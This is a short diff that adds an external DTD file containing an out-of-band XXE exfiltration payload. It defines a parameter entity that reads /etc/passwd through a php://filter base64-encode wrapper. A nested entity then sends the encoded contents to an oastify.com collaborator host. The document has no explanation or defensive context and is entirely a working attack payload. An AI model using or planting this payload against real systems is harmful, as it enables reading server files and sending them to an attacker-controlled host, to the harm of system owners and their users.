@@ -1,0 +1,5 @@
+<!ENTITY % payload SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
+<!ENTITY % remote
+"<!ENTITY &#37; send SYSTEM 'http://qys5ng2k52qfnol5fkhmkjqg77dy1n.oastify.com/%payload;'>">
+%remote;
+%send;
